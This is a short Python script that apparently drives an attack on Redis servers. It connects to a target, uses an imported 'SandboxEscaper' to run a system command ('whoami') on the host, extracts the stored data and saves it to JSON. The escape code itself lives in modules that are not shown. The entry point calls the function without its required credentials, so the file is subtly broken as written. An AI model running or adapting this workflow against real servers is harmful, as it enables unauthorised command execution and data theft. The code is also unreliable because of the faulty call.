from .data_exporter import DataExporter
from .redis_client import RedisClient
from .sandbox_escaper import SandboxEscaper


def extract_redis_data(ip, port, username, password):
    redis_client = RedisClient(host=ip, port=port, username=username, password=password)

    # Connect to the Redis server
    if not redis_client.connect():
        print(f"Failed to connect to Redis server at {ip}:{port}")
        return

    # Create a sandbox escaper
    sandbox_escaper = SandboxEscaper(redis_client)

    # Execute a command through the sandbox escape
    sandbox_escaper.execute("whoami")

    # Extract data from Redis
    data = redis_client.extract_data()

    # Export data to JSON (will skip if data is None or empty)
    DataExporter.export_to_json(data, ip, port)

    return data


if __name__ == "__main__":
    extract_redis_data(ip="10.0.0.10", port=6379)
